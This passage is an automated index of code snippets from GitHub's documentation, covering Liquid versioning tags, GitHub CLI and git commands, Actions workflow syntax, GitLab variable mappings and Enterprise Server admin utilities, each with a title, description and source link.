%}\n```\n\nLANGUAGE: html\nCODE:\n```\n{% rowheaders %}\n```\n\n----------------------------------------\n\nTITLE: Expiring Content Syntax\nDESCRIPTION: This shows the correct syntax for adding an expiration date to content. The linter will warn 14 days before and error on the specified date.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-content-linter.md#_snippet_9\n\nLANGUAGE: Markdown\nCODE:\n```\nThis content does not expire.\n<!-- expires 2022-01-28 -->\nThis content expires on January 28, 2022.\n<!-- end expires 2022-01-28 -->\nThis content also does not expire.\n```\n\n----------------------------------------\n\nTITLE: Filtering Workflow Runs by Workflow using GitHub CLI\nDESCRIPTION: This snippet shows how to filter workflow runs by a specific workflow using the `-w` or `--workflow` flag. Replace `WORKFLOW` with the workflow name, ID, or file name.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngh run list --workflow WORKFLOW\n```\n\n----------------------------------------\n\nTITLE: Installing GnuCOBOL on MacOS with Homebrew\nDESCRIPTION: This command uses Homebrew to install the GnuCOBOL compiler on macOS. GnuCOBOL is necessary for compiling and running the legacy COBOL code before modernization.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nbrew install gnu-cobol\n```\n\n----------------------------------------\n\nTITLE: Validating GHSA ID with Regular Expression in Bash\nDESCRIPTION: This code snippet provides a regular expression to validate GHSA IDs. GHSA IDs follow the format `GHSA-xxxx-xxxx-xxxx`, where `x` is a letter or number from the set `23456789cfghjmpqrvwx`.  The regex can be used in bash scripts or other contexts where regular expression matching is supported.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n/GHSA(-[23456789cfghjmpqrvwx]{4}){3}/\n```\n\n----------------------------------------\n\nTITLE: Linking to content with a specific tool - Markdown\nDESCRIPTION: This code snippet shows how to create a link that automatically selects a specific tool within the linked content. It appends `?tool=TOOLNAME` to the URL. Replace `TOOLNAME` with the actual tool identifier.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_24\n\nLANGUAGE: Markdown\nCODE:\n```\nFor more information, see the TOOLNAME documentation in [ARTICLE TITLE](/PATH/TO/ARTICLE?tool=TOOLNAME).\n```\n\n----------------------------------------\n\nTITLE: Retrieving JWT with curl and processing (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to retrieve a JSON Web Token (JWT) from the {% data variables.product.prodname_dotcom %} OIDC provider using `curl`, process it using `jq`, and set it as an output.  It uses the outputs from the previous step (`script`) to construct the `curl` command. It also includes a shell function `jwtd` for decoding the JWT if `jq` is available.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n    - run: |\n        IDTOKEN=$(curl -H \"Authorization: bearer {% raw %} ${{steps.script.outputs.TOKEN}}\" ${{steps.script.outputs.IDTOKENURL}} {% endraw %} -H \"Accept: application/json; api-version=2.0\" -H \"Content-Type: application/json\" -d \"{}\" | jq -r '.value')\n        echo $IDTOKEN\n        jwtd() {\n            if [[ -x $(command -v jq) ]]; then\n                jq -R 'split(\".\") | .[0],.[1] | @base64d | fromjson' <<< \"${1}\"\n                echo \"Signature: $(echo \"${1}\" | awk -F'.' '{print $3}')\"\n            fi\n        }\n        jwtd $IDTOKEN\n        echo \"idToken=${IDTOKEN}\" >> $GITHUB_OUTPUT\n      id: tokenid\n```\n\n----------------------------------------\n\nTITLE: Disabling linter rule within a code block\nDESCRIPTION: This disables the specified linter rule for the entire code block. Replace `MD011` with the rule to disable.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-content-linter.md#_snippet_12\n\nLANGUAGE: text\nCODE:\n```\n<!-- markdownlint-disable MD011 -->\n```\n(^|/)[Cc]+odespace/\n```\n<!-- markdownlint-enable MD011 -->\n```\n\n----------------------------------------\n\nTITLE: Adding a Remote Repository\nDESCRIPTION: Adds a new remote repository URL to the local Git configuration, allowing pushing changes to the new repository. Replace `USERNAME` and `REPOSITORY-NAME` with the correct values.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/splitting-a-subfolder-out-into-a-new-repository.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ngit remote add origin https://{% data variables.product.product_url %}/USERNAME/REPOSITORY-NAME.git\n```\n\n----------------------------------------\n\nTITLE: Executing Migration Script in Terminal\nDESCRIPTION: This script demonstrates how to execute a generated migration script in Terminal. It utilizes the `./` prefix to specify the current directory when executing the script. Replace `FILENAME` with the actual name of the script file.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/migrate-multiple-repos.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n./FILENAME\n```\n\n----------------------------------------\n\nTITLE: Referencing Specific Patch Release Tag in GitHub Actions Workflow (YAML)\nDESCRIPTION: This snippet shows how to reference a specific patch release tag in a GitHub Actions workflow.  This gives users precise control over the action version used.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/about-custom-actions.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n    - uses: actions/javascript-action@v1.0.1\n```\n\n----------------------------------------\n\nTITLE: Looping through Enterprise Server Releases (Supported)\nDESCRIPTION: This code snippet iterates through the supported versions of GitHub Enterprise Server and generates a table row for each version, including release date, deprecation date, support status, release notes link, and documentation link. It uses Liquid template language.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/all-releases.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{%- for version in enterpriseServerReleases.supported %}\n{%- assign currentDate = 'now' | date: '%s' %}\n{%- assign deprecationDate = enterpriseServerReleases.dates[version].deprecationDate | date: '%s' %}\n| {{version}} | {{enterpriseServerReleases.dates[version].releaseDate}} | {{enterpriseServerReleases.dates[version].deprecationDate}} | {% if currentDate < deprecationDate %}{% octicon \"check\" aria-label=\"Supported\" %}{% else %}{% octicon \"x\" aria-label=\"Not supported\" %}{% endif %} | [{{version}} release notes](/enterprise-server@{{version}}/admin/release-notes) | [{{version}} documentation](/enterprise-server@{{version}}) |\n{%- endfor %}\n```\n\n----------------------------------------\n\nTITLE: Example Update Output\nDESCRIPTION: This snippet provides an example of the expected output when running the `gh actions-importer update` command, showing that the image is up-to-date.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-jenkins-with-github-actions-importer.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nUpdating ghcr.io/actions-importer/cli:latest...\nghcr.io/actions-importer/cli:latest up-to-date\n```\n\n----------------------------------------\n\nTITLE: Set Release Candidate Version - JavaScript\nDESCRIPTION: This code snippet shows how to set the `releaseCandidate` variable in `lib/enterprise-server-releases.js` to the new GHES release version. This indicates which version is currently the release candidate.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/release-templates/release-steps-1.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nexport const releaseCandidate = '3.10'\n```\n\n----------------------------------------\n\nTITLE: Cloning a Repository using GitHub CLI\nDESCRIPTION: This snippet demonstrates how to clone a repository locally using the `gh repo clone` subcommand. It supports cloning using the repository name (OWNER/REPO) or the GitHub URL. The OWNER defaults to the authenticated user if omitted.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/cloning-a-repository.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh repo clone REPOSITORY\n```\n\n----------------------------------------\n\nTITLE: Resolving Extractor Pack with CodeQL CLI\nDESCRIPTION: This command resolves the extractor pack to be used for a specified language. It requires the `--language` option and can accept multiple `--search-path` options to locate the extractor packs. The output can be formatted as text or JSON.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-extractor.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql resolve extractor --language=<lang> <options>...\n```\n\n----------------------------------------\n\nTITLE: Nested Conditionals: GHES != 2.13 and FPT, Liquid\nDESCRIPTION: This example demonstrates nested `ifversion` tags where the outer check is if the GHES version is not 2.13. If true, it renders \"Alpha\" and then checks for the presence of FPT, rendering \"Bravo\" if present. If GHES is 2.13 it renders \"Charlie\".\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/not-equals.md#_snippet_4\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes != 2.13 %}\n\nAlpha\n\n{% ifversion fpt %}\n\nBravo\n\n{% endif %}\n\n{% else %}\n\nCharlie\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Empty Update of Subversion Branches\nDESCRIPTION: This snippet performs an empty update of the `branches` directory in a Subversion checkout. This prevents downloading all the branches immediately. This is helpful for repositories with a large number of branches. It requires the svn client and an existing svn checkout.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/working-with-subversion-on-github/support-for-subversion-clients.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ svn up --depth empty branches\n> Updated to revision 1.\n```\n\n----------------------------------------\n\nTITLE: Searching models by tags on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models tagged with 'agents' on GitHub Marketplace using the `in:tags` qualifier. The search query filters models based on the presence of the specified tag.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_0\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=in:tags+agents&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Desktop Content Liquid Tag\nDESCRIPTION: Defines a section of content that is displayed when the `desktop` tool is selected.  This snippet demonstrates the structure of embedding desktop specific content in the document using Liquid tags.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/tool-specific.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n{% desktop %}\n  this is desktop content\n{% enddesktop %}\n```\n\n----------------------------------------\n\nTITLE: Sorting search by creation date desc on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to sort models by creation date in descending order, filtered by 'Meta' as the publisher using `sort:created-desc` and `publisher:meta`.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_19\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=sort:created-desc+publisher:meta&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Creating Links in Markdown\nDESCRIPTION: This code snippet demonstrates how to create an inline link in Markdown using brackets for link text and parentheses for the URL. It showcases the standard format for hyperlinks.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_5\n\nLANGUAGE: markdown\nCODE:\n```\nThis site was built using [GitHub Pages](https://pages.github.com/).\n```\n\n----------------------------------------\n\nTITLE: Conditional Table Row\nDESCRIPTION: This snippet demonstrates how to conditionally include a table row based on the `volvo` version. It checks if the `volvo` version is enabled and includes the Cargo and Rust row if it is.\nSOURCE: https://github.com/github/docs/blob/main/src/content-linter/tests/fixtures/tables.md#_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\n{% ifversion volvo %}\n| Cargo | Rust | `Cargo.lock` | `Cargo.toml`, `Cargo.lock` |\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Prune Docker System\nDESCRIPTION: This command removes unused Docker images, networks, and containers from the GitHub Codespaces environment. It helps reclaim disk space occupied by Docker-related resources.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-creation-and-deletion-of-codespaces.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ndocker system prune\n```\n\n----------------------------------------\n\nTITLE: Referencing Kubernetes Secret in values.yaml\nDESCRIPTION: This snippet shows how to reference the created Kubernetes secret (containing GitHub App credentials) in the `values.yaml` file for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\ngithubConfigSecret: pre-defined-secret\n```\n\n----------------------------------------\n\nTITLE: Configuring collectd Server Listener\nDESCRIPTION: This configuration snippet sets up the collectd server to listen for incoming network connections. It loads the network plugin and specifies the address and port for listening.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/configuring-collectd-for-your-instance.md#_snippet_0\n\nLANGUAGE: conf\nCODE:\n```\nLoadPlugin network\n...\n...\n<Plugin network>\n    Listen \"0.0.0.0\" \"25826\"\n</Plugin>\n```\n\n----------------------------------------\n\nTITLE: Listing organization secrets via GitHub CLI\nDESCRIPTION: This snippet shows how to list all secrets for an organization using the GitHub CLI. Requires the CLI to be installed and configured, and the user to have the `admin:org` scope.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\ngh secret list --org ORG_NAME\n```\n\n----------------------------------------\n\nTITLE: Creating a Service Account with gcloud\nDESCRIPTION: This command creates a new service account using the `gcloud iam service-accounts create` command. The service account name is determined by the `$SA_NAME` environment variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngcloud iam service-accounts create $SA_NAME\n```\n\n----------------------------------------\n\nTITLE: Complex Boolean Expression in Code Search\nDESCRIPTION: This snippet demonstrates a more complex boolean expression using parentheses.  It searches for ruby or python files that are not in the `/tests/` path.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_7\n\nLANGUAGE: text\nCODE:\n```\n(language:ruby OR language:python) AND NOT path:\"/tests/\"\n```\n\n----------------------------------------\n\nTITLE: WebUI Content Liquid Tag\nDESCRIPTION: Defines a section of content that is only displayed when the `webui` tool is selected.  This example demonstrates how to embed webui specific content using Liquid tags.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/tool-specific.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n{% webui %}\n\n1. this is webui content\n\n{% endwebui %}\n```\n\n----------------------------------------\n\nTITLE: Listing Classrooms using GitHub CLI\nDESCRIPTION: This command lists the classrooms owned by the authenticated user. It requires the GitHub CLI to be installed and authenticated with a GitHub account, as well as the GitHub Classroom extension. The output is a list of the user's classrooms in the console.\nSOURCE: https://github.com/github/docs/blob/main/content/education/manage-coursework-with-github-classroom/teach-with-github-classroom/using-github-classroom-with-github-cli.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh classroom list\n```\n\n----------------------------------------\n\nTITLE: Saving Codespace Logs to a File Using GitHub CLI\nDESCRIPTION: This code snippet shows how to save codespace logs to a file using the GitHub CLI. The command redirects the output of `gh codespace logs -c <CODESPACE-NAME>` to a specified file path.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/github-codespaces-logs.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace logs -c <CODESPACE-NAME> > /path/to/logs.txt\n```\n\n----------------------------------------\n\nTITLE: Removing Files from the Repository\nDESCRIPTION: This command removes the specified files from both the working directory and the Git repository. Replace `FILENAME` with the name of the file to be removed.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\ngit rm example-deleted-file.md\n```\n\n----------------------------------------\n\nTITLE: Switching to an Existing Topic Branch\nDESCRIPTION: This command switches the current working directory to a pre-existing topic branch. This allows a user to continue working on a specific feature or documentation update.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ngit checkout YOUR-TOPIC-BRANCH\n```\n\n----------------------------------------\n\nTITLE: Opening a GitHub codespace in VS Code using gh codespace code\nDESCRIPTION: This command opens a specific codespace in the web version of VS Code. The `-w` flag ensures that the command waits for the file to be closed in VS Code before proceeding.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_10\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace code -w\n```\n\n----------------------------------------\n\nTITLE: Running Playwright Tests with CI and Workers\nDESCRIPTION: This command runs Playwright tests with the CI environment variable set and specifies the number of workers to use, allowing control over parallelism in the CI environment.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_13\n\nLANGUAGE: shell\nCODE:\n```\nPLAYWRIGHT_WORKERS=4 CI=1 npm run playwright-test -- playwright-rendering\n```\n\n----------------------------------------\n\nTITLE: Setting Default Tool - YAML\nDESCRIPTION: This snippet shows how to use the `defaultTool` frontmatter property to override the initial tool selection for a page. It provides an example for setting the default tool to CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/README.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\ndefaultTool: cli\n```\n\n----------------------------------------\n\nTITLE: Abort Migration with GitHub CLI\nDESCRIPTION: This command aborts a migration using the `gh bbs2gh abort-migration` command. It requires specifying the migration ID.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-bitbucket-server-to-github-enterprise-cloud/migrating-repositories-from-bitbucket-server-to-github-enterprise-cloud.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ngh bbs2gh abort-migration --migration-id MIGRATION-ID\n```\n\n----------------------------------------\n\nTITLE: Using GITHUB_TOKEN in GitHub Actions with Ruby\nDESCRIPTION: This code shows how to authenticate with the GitHub API in a GitHub Actions workflow using the `GITHUB_TOKEN`. It accesses the token from an environment variable `ENV['TOKEN']`.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'octokit'\n\noctokit = Octokit::Client.new(access_token: ENV['TOKEN'])\n```\n\n----------------------------------------\n\nTITLE: Codespace Recovery Mode Message\nDESCRIPTION: This message indicates that the Codespace is running in recovery mode due to a container error. It suggests reviewing the creation logs and updating the dev container configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-creation-and-deletion-of-codespaces.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nThis codespace is currently running in recovery mode due to a container error.\n```\n\n----------------------------------------\n\nTITLE: Setting Default Platform - YAML\nDESCRIPTION: This snippet shows how to use the `defaultPlatform` frontmatter property to override the initial platform selection for a page. It provides an example for setting the default platform to Linux.\nSOURCE: https://github.com/github/docs/blob/main/content/README.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\ndefaultPlatform: linux\n```\n\n----------------------------------------\n\nTITLE: Demoting a User (Shell)\nDESCRIPTION: Demotes the specified user from admin status to that of a regular user using the `ghe-user-demote` utility. Replace `USERNAME` with the username to demote.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_110\n\nLANGUAGE: shell\nCODE:\n```\nghe-user-demote USERNAME\n```\n\n----------------------------------------\n\nTITLE: Adding a horizontal rule using Markdown\nDESCRIPTION: This snippet shows how to add a horizontal rule to divide sections in your profile README. It uses three or more dashes (`---`) on a single line.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/quickstart-for-writing-on-github.md#_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n---\n\n```\n\n----------------------------------------\n\nTITLE: Disabling Replication via ghe-cluster-repl-teardown\nDESCRIPTION: This snippet shows how to disable replication using the `ghe-cluster-repl-teardown` utility. This command stops replication to replica nodes.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/configuring-high-availability-replication-for-a-cluster.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nghe-cluster-repl-teardown\n```\n\n----------------------------------------\n\nTITLE: Searching by Location\nDESCRIPTION: This example demonstrates how to search for users based on the location they have indicated in their profile using the `location` qualifier.  It allows to find users residing in a specific location.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-users.md#_snippet_3\n\nLANGUAGE: none\nCODE:\n```\nrepos:1 location:iceland\n```\n\n----------------------------------------\n\nTITLE: Installing git-filter-repo\nDESCRIPTION: This command installs the `git-filter-repo` tool using Homebrew.  `git-filter-repo` is a tool used for rewriting Git history, which is required to remove sensitive data.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbrew install git-filter-repo\n```\n\n----------------------------------------\n\nTITLE: Markdown Note Alert\nDESCRIPTION: This snippet demonstrates how to create a 'Note' alert box in Markdown. The `[!NOTE]` syntax is used to highlight additional information or clarification. This alert box provides supplementary context.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/markdown/alerts.md#_snippet_1\n\nLANGUAGE: Markdown\nCODE:\n```\n> [!NOTE]\n> A note.\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_COMMIT_SHA to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_COMMIT_SHA` to the GitHub Actions equivalent `${{ github.sha }}`. This variable provides the full SHA of the commit that triggered the workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_20\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.sha }}\n```\n\n----------------------------------------\n\nTITLE: Listing docker images - Docker CLI\nDESCRIPTION: This command lists the Docker images available on the local system, along with their repository, tag, image ID, creation date, and size.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\n$ docker images\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_JOB_MANUAL to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_JOB_MANUAL` to the GitHub Actions equivalent `${{ github.event_name == 'workflow_dispatch' }}`.  Checks whether the workflow was triggered manually.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_24\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event_name == 'workflow_dispatch' }}\n```\n\n----------------------------------------\n\nTITLE: Authenticating with GitHub CLI\nDESCRIPTION: This code snippet demonstrates how to authenticate with GitHub using the GitHub CLI. It prompts the user to select an authentication method and follow on-screen instructions.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngh auth login\n```\n\n----------------------------------------\n\nTITLE: Adding Sinatra Gem (Shell)\nDESCRIPTION: This command adds the Sinatra gem to the project's `Gemfile`. Sinatra is a lightweight web framework for Ruby, used for creating the web application.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nbundle add sinatra\n```\n\n----------------------------------------\n\nTITLE: Versioning for Free, Pro, & Team and GHES in YAML\nDESCRIPTION: This YAML snippet demonstrates versioning content for Free, Pro, & Team (fpt) and all versions of GitHub Enterprise Server (ghes) using the '*' wildcard.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nversions:\n  fpt: *\n  ghes: *\n```\n\n----------------------------------------\n\nTITLE: Stopping Instance via Command Line\nDESCRIPTION: This command is used to shut down the instance. It requires SSH access to the instance and administrative privileges (sudo). Running this command will power off the virtual machine.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/increase-resources-shut-down.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nsudo poweroff\n```\n\n----------------------------------------\n\nTITLE: Navigating to actions-sync bin directory (cd)\nDESCRIPTION: Changes the current directory in the terminal to the 'bin' directory within the extracted actions-sync release directory. This step is essential for executing the actions-sync tool.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/managing-access-to-actions-from-githubcom/manually-syncing-actions-from-githubcom.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncd PATH/TO/gh_DATETIME_OS_ARCHITECTURE/bin\n```\n\n----------------------------------------\n\nTITLE: Applying Configuration Changes\nDESCRIPTION: This snippet applies the configuration changes made to the GitHub Enterprise Server staging instance. It runs the `ghe-config-apply` command to persist the changes and activate the updated settings.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/setting-up-a-staging-instance.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-config-apply\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_TITLE to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_TITLE` to the GitHub Actions equivalent `${{ github.event.pull_request.title }}`. Accesses the title of a pull request from the event context.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_72\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.title }}\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on Wiki page update\nDESCRIPTION: This code snippet shows how to trigger a GitHub Actions workflow when a Wiki page is created or updated. The `on` keyword specifies the `gollum` event.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  gollum\n```\n\n----------------------------------------\n\nTITLE: Uninstalling OpenSSH with Homebrew\nDESCRIPTION: This snippet shows how to uninstall OpenSSH on macOS using the Homebrew package manager. Removing OpenSSH restores the ability of the Apple keychain to retrieve passphrases.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-unknown-key-type.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nbrew uninstall openssh\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering based on GHES version\nDESCRIPTION: This snippet uses the `ifversion` tag to conditionally render \"Alpha\" if the GHES version is greater than 2.13 and less than 2.16. It demonstrates a simple version check for a specific feature or content.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/and-greater-than2.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > 2.13 and ghes < 2.16 %}\n\nAlpha\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PROJECT_URL to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PROJECT_URL` to the GitHub Actions equivalent `${{ github.server_url }}/${{ github.repository }}`. Constructs URL for project in Github Actions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_44\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.server_url }}/${{ github.repository }}\n```\n\n----------------------------------------\n\nTITLE: Opening Codespace in VS Code via GitHub CLI\nDESCRIPTION: This command opens a GitHub Codespace in Visual Studio Code. It requires VS Code to be installed on the local machine. The command uses the GitHub CLI to initiate the connection.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/opening-an-existing-codespace.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace code\n```\n\n----------------------------------------\n\nTITLE: Set Cache Policy for Repository Network\nDESCRIPTION: This command sets a cache policy for a specific repository network, identified by the owner and repository name (owner/repository).  It replicates a single copy to the cache location (kansas).\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/caching-repositories/configuring-a-repository-cache.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nghe-spokesctl cache-policy set <owner/repository> 1 kansas\n```\n\n----------------------------------------\n\nTITLE: Cloning a Repository with a Personal Access Token - Shell\nDESCRIPTION: This shell command demonstrates how to clone a Git repository using a personal access token (PAT) embedded in the URL. It replaces `USERNAME` with the user's GitHub username, `$YOUR-VARIABLE` with the environment variable or secret containing the PAT, `OWNER` with the repository owner's username or organization name, and `REPO` with the repository's name. This method allows authentication for repositories beyond the default one in a Codespace.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-authentication-to-a-repository.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit clone https://USERNAME:$YOUR-VARIABLE@github.com/OWNER/REPO`\n```\n\n----------------------------------------\n\nTITLE: Populating Manifest Field with 